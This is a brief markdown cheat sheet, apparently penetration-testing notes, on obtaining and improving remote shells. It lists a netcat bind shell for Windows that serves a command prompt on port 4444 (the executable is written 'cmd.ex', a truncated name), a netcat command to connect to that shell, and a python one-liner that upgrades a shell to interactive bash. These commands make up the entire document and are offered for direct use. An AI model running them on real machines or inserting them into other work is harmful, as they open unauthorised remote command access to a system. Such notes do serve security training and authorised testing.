# Shells

## Windows Netcat Bind shells

Shell waiting for incoming connection

```bash
nc -nlvp 4444 -e cmd.ex
```

Connecting to shell

```bash
nc -nv <ip address> 4444
```



## Upgrading shells

````bash
python -c 'import pty; pty.spawn("/bin/bash")'
````



